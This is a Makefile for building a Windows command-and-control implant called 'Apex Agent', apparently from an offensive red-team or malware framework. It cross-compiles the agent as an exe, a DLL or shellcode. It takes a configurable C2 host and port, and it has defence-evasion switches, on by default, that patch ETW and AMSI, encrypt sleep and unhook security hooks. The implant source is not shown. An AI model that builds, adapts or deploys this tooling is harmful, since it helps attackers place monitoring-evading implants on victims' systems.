# Apex Agent - Windows payload build
# Requires: x86_64-w64-mingw32-gcc (mingw-w64)

CC = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -Wextra -O2 -D_WIN32_WINNT=0x0600 -static-libgcc
LDFLAGS = -lwinhttp -lws2_32 -lbcrypt -static-libgcc

# Build-time config (override)
C2_HOST ?= 127.0.0.1
C2_PORT ?= 8080
USE_HTTPS ?= 0

# Evasion toggles (1=enabled, 0=disabled)
ENABLE_ETW_PATCH ?= 1
ENABLE_AMSI_PATCH ?= 1
ENABLE_SLEEP_ENCRYPT ?= 1
ENABLE_UNHOOK ?= 1

CFLAGS += -DC2_HOST=\"$(C2_HOST)\" -DC2_PORT=$(C2_PORT) -DUSE_HTTPS=$(USE_HTTPS)
CFLAGS += -DENABLE_ETW_PATCH=$(ENABLE_ETW_PATCH)
CFLAGS += -DENABLE_AMSI_PATCH=$(ENABLE_AMSI_PATCH)
CFLAGS += -DENABLE_SLEEP_ENCRYPT=$(ENABLE_SLEEP_ENCRYPT)
CFLAGS += -DENABLE_UNHOOK=$(ENABLE_UNHOOK)

.PHONY: exe dll shellcode all clean

exe:
	$(CC) $(CFLAGS) -o agent.exe main.c $(LDFLAGS)

dll:
	$(CC) $(CFLAGS) -shared -DBUILD_DLL -o agent.dll main.c $(LDFLAGS)

shellcode: exe
	cp agent.exe agent.bin

all: exe

clean:
	rm -f agent.exe agent.dll agent.bin agent_shellcode.o
